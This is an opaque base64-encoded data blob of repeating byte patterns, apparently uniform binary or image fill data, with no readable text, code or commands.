1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dX